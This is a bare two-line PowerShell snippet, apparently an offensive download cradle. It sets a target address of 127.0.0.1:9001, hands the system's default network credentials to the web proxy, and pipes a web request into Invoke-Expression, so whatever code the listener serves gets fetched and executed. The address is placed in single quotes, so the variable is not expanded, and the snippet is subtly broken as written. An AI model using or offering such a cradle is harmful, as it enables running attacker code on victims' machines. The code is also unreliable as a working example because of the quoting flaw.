$IP="127.0.0.1:9001"
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$IP')|iex